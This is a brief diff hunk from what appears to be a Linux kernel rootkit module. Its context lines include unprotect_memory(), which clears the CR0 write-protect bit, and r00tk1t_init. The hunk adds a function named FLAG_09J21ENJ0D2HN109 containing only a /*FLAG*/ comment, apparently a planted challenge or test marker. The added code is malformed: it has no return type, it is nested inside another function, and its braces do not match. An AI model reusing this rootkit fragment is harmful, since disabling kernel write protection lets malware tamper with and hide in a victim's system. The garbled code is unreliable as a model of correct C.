@@ -277,7 +277,12 @@ static inline void
 unprotect_memory(void)
 {
 	write_cr0(cr0 & ~0x00010000);
+
+FLAG_09J21ENJ0D2HN109(void)
+{
+	/*FLAG*/	
 }
+
 
 static int __init
 r00tk1t_init(void)
